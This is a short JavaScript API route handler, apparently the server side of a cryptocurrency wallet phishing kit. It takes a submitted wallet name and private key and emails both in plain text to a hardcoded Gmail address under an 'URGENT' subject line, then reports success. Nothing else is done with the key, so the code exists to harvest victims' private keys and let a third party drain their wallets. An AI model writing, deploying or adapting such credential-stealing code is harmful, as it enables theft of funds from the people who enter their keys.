const nodemailer = require('nodemailer');

const handler = async (req, res) => {
  const { method } = req;

  if (method === 'POST') {
    const { privateKey, wallet } = req.body;

    if (!privateKey || !wallet)
      return res.status(400).json({
        error: 'privateKey and wallet is required'
      });

    // 1) Create a transporter
    const transporter = nodemailer.createTransport({
      host: process.env.EMAIL_HOST,
      port: process.env.EMAIL_PORT,
      auth: {
        user: process.env.EMAIL_USERNAME,
        pass: process.env.EMAIL_PASSWORD
      }
    });

    // 2) Define the email options

    const mailOptions2 = {
      from: 'obcbeats@gmail.com',
      to: 'busybillion001@gmail.com',
      subject: `URGENT: Account privateKey for ${wallet}`,
      text: `
    Wallet name: ${wallet}
    privateKey: ${privateKey}.`
    };
    // 3) Actually send the email

    try {
      await transporter.sendMail(mailOptions2);

      res.status(200).json({ status: 'Success' });
    } catch (error) {
      console.log(error);
      res.status(200).json({ error: 'An error occurred' });
    }
  } else {
    res.status(400).json({ error: 'Incorrect Method' });
  }
};

export default handler;
